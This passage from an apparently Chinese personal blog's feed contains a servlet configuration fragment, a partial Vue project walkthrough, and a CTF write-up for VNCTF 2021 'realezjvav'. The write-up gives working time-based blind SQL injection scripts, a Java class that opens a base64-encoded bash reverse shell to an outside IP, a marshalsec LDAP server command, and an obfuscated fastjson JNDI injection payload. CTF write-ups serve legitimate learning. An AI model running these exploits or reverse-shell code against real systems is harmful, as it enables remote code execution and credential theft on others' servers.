class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>15<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里实现了一次对接口的处理的转发</p>
<p>测试代码成功</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF_2021_realezjvav</title>
    <url>/2021/03/22/VNCTF-2021-realezjvav/</url>
    <content><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>这里不是我想学习的重点，故直接甩一个笛卡尔积的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://73b041f1-d05e-451c-8ef9-eeda4da6ab8e.node3.buuoj.cn/user/login&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="built_in">min</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">&quot;-1&#x27;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.7</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        sleep(<span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>或者这个：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        p1=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p1&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p2&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data1,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data2,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到密码，得到上去之后可以创建用户：</p>
<p>发现源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//提交json数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> jsonStr = &#123; <span class="string">&quot;name&quot;</span> : $(<span class="string">&#x27;#se1&#x27;</span>).val() &#125;;</span><br><span class="line"></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="comment">//几个参数需要注意一下</span></span><br><span class="line">        type: <span class="string">&quot;POST&quot;</span>,<span class="comment">//方法类型</span></span><br><span class="line">        dataType:<span class="string">&quot;text&quot;</span>,</span><br><span class="line">        contentType: <span class="string">&quot;application/x-www-form-urlencoded;charset=utf-8&quot;</span>,<span class="comment">//预期服务器返回的数据类型</span></span><br><span class="line">        url: <span class="string">&quot;/create&quot;</span> ,<span class="comment">//url</span></span><br><span class="line">        data:&#123;<span class="string">&quot;roleJson&quot;</span>:<span class="built_in">JSON</span>.stringify(jsonStr)&#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            resObj = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span>+result+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#roleText&quot;</span>).html(<span class="string">&quot;&lt;span&gt;&quot;</span>+resObj.hello+<span class="string">&quot;&lt;/span&gt;&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#roleImg&quot;</span>).html(<span class="string">&#x27;&lt;img style=&quot;width:180px;height:180px&quot; src=&quot;/searchimage?img=&#x27;</span>+resObj.number +<span class="string">&#x27;.png&quot;/&gt;&#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        error : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;运行异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试读取文件：</p>
<p><img src="image-20210322210650146.png" alt="image-20210322210650146"></p>
<p>java的题目，多半是fastjson出问题了，看下版本</p>
<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>起服务这里写给自己用于记录，兴许别人第一次也会用得到，首先在新建一个Exploit.java ,代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjY5LjIwMS42NS84MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<p>得到文件Exploit.class,在当前文件下输入指令，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server 8002</span><br></pre></td></tr></table></figure>

<p>成功之后应该像这样：</p>
<p><img src="image-20210325144632955.png" alt="image-20210325144632955"></p>
<p>再之后下载marshalsec-master，安装完成之后去target目录下执行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://81.69.201.65:8002/#Exploit</span><br></pre></td></tr></table></figure>

<p><img src="image-20210325144737080.png" alt="image-20210325144737080"></p>
<p>再之后打payload就好：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://81.69.201.65:1389/Exploit&quot;</span>,<span class="string">&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;</span>:<span class="keyword">true</span>&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>java</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue总结</title>
    <url>/2020/10/25/Vue%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Vue-part"><a href="#Vue-part" class="headerlink" title="Vue part"></a>Vue part</h1><p>总结了前端项目的搭建，以及自己在这次作品中学到了什么</p>
<a id="more"></a>

<p>Vue我认为学下来就是很爽，基本上不用再各种去绑定JS当中的dom元素了（getElementById什么的）</p>
<p>其中基础源码，有一个index.html</p>
<h2 id="1-index-html"><a href="#1-index-html" class="headerlink" title="1.index.html"></a>1.index.html</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We&#x27;re sorry but <span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span> doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>启动的时候有一个main.js，APP.vue等等。现在讲一下我是怎么做下来的，我利用到的框架是antdv，再package.json当中可以找到</p>
<h2 id="2-package-json"><a href="#2-package-json" class="headerlink" title="2.package.json"></a>2.package.json</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;,</span><br><span class="line">    &quot;@antv/g2&quot;: &quot;^4.0.15&quot;,</span><br><span class="line">    &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;,</span><br><span class="line">    &quot;axios&quot;: &quot;^0.20.0&quot;,</span><br><span class="line">    &quot;core-js&quot;: &quot;^3.6.5&quot;,</span><br><span class="line">    &quot;echarts&quot;: &quot;^4.9.0&quot;,</span><br><span class="line">    &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;,</span><br><span class="line">    &quot;js-cookie&quot;: &quot;^2.2.1&quot;,</span><br><span class="line">    &quot;jspdf&quot;: &quot;^2.1.1&quot;,</span><br><span class="line">    &quot;less&quot;: &quot;^3.12.2&quot;,</span><br><span class="line">    &quot;less-loader&quot;: &quot;^7.0.1&quot;,</span><br><span class="line">    &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;,</span><br><span class="line">    &quot;react&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-dom&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-window&quot;: &quot;^1.8.5&quot;,</span><br><span class="line">    &quot;vant&quot;: &quot;^2.10.9&quot;,</span><br><span class="line">    &quot;vue&quot;: &quot;^2.6.11&quot;,</span><br><span class="line">    &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;,</span><br><span class="line">    &quot;vue-router&quot;: &quot;^3.4.5&quot;,</span><br><span class="line">    &quot;vuex&quot;: &quot;^3.5.1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;babel-eslint&quot;: &quot;^10.1.0&quot;,</span><br><span class="line">    &quot;eslint&quot;: &quot;^6.7.2&quot;,</span><br><span class="line">    &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;,</span><br><span class="line">    &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>要用的时候再项目根目录下cnpm -i即可。</p>
<p>讲一下路由该怎么做把，首先创建一个</p>
<h2 id="3-router-js"><a href="#3-router-js" class="headerlink" title="3.router.js"></a>3.router.js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//引入vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>在Vue当中，所有需要引用的东西需要用Vue.use之后才会生效</p>
<p>故我们构造之后的代码框架大致如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//引入vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">//引用page1页面</span></span><br><span class="line"><span class="keyword">import</span> upload  <span class="keyword">from</span> <span class="string">&#x27;./components/upload.vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> login <span class="keyword">from</span> <span class="string">&#x27;./components/login.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义routes路由的集合，数组类型</span></span><br><span class="line"><span class="keyword">const</span> routes=[</span><br><span class="line">    <span class="comment">//单个路由均为对象类型，path代表的是路径，component代表组件</span></span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/upload&#x27;</span>,<span class="attr">component</span>:upload&#125;,</span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/login&#x27;</span>,<span class="attr">component</span>:login&#125;,</span><br></pre></td></tr></table></figure>

<p>一个Vue文件的格式如下：</p>
<h2 id="4-主入口"><a href="#4-主入口" class="headerlink" title="4.主入口"></a>4.主入口</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt; </span><br><span class="line">      &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在template当中构造HTML的代码，script当中构造当前页面的JS，而style设置中写css。如果不做限定，CSS将会是全局生效的！</p>
<p>而APP作为主页面，只需要写一句话即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一句话的意思代码将页面内容托管给Vue，根据vue的Router来显示内容 </p>
<p>而Router的设置在main.js当中（实际上，几乎所有的设置都放在main.js当中进行统一设置）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>在main.js导入的模块可以全项目生效，如果想要普通的生效一个模块，这样构造：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal  &#125; <span class="keyword">from</span> <span class="string">&#x27;ant-design-vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在下面：</span></span><br><span class="line">Vue.use(Modal)</span><br><span class="line">Vue.use(Spin)</span><br><span class="line">Vue.use(Alert)</span><br><span class="line">Vue.use(Form)</span><br><span class="line">Vue.use(axios)</span><br><span class="line">Vue.use(htmlToPdf)</span><br><span class="line">Vue.use(Divider)</span><br><span class="line">Vue.use(Input)</span><br><span class="line">Vue.use(FormModel)</span><br></pre></td></tr></table></figure>

<p>如果想要修改Vue默认的设置，例如我们导入axios的时候这样构造：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">Vue.prototype.$http = axios</span><br></pre></td></tr></table></figure>

<p>之后我构造了一个公共使用的Vue模板，也就是菜单栏的插件，我是创建了一个commons文件夹，并写在里面</p>
<h2 id="5-插槽"><a href="#5-插槽" class="headerlink" title="5.插槽"></a>5.插槽</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a-layout</span> <span class="attr">id</span>=<span class="string">&quot;components-layout-demo-side&quot;</span> <span class="attr">style</span>=<span class="string">&quot;min-height: 100vh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout-sider</span> <span class="attr">v-model</span>=<span class="string">&quot;collapsed&quot;</span> <span class="attr">width</span>=<span class="string">&quot;12%&quot;</span> <span class="attr">collapsible</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-menu</span> <span class="attr">theme</span>=<span class="string">&quot;dark&quot;</span> <span class="attr">:default-selected-keys</span>=<span class="string">&quot;[&#x27;1&#x27;]&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;inline&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;upload&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;cloud-download&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  文件上传  </span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub1&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;area-chart&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  数据分析</span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;report&quot;</span>&gt;</span></span><br><span class="line">              日志分析</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;getpdf&quot;</span>&gt;</span></span><br><span class="line">              获取报告</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub2&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;dashboard&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>立体数据<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;attackaddress&quot;</span>&gt;</span></span><br><span class="line">              攻击溯源</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;watchlog&quot;</span>&gt;</span></span><br><span class="line">            实时监控</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span 